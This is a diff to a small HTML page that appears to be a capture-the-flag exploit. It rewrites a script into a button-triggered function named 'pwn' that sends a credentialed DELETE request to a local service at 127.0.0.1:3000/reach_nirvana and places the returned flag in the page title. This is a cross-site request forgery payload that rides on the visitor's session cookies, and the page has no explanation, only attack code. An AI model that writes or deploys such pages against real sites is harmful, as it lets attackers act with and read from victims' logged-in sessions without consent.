@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
+
+<button onclick="pwn()">Submit</button>
+
 <script>
-fetch('http://127.0.0.1:3000/reach_nirvana', {
-  method: 'DELETE',
-  credentials: 'include'
-})
-.then(r => r.text())
-.then(flag => {
+async function pwn() {
+  const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
+    method: 'DELETE',
+    credentials: 'include'
+  });
+
+  const flag = await r.text();
   document.title = flag;
-});
+}
 </script>
 
-<button>Submit</button>
 </body>
 </html>
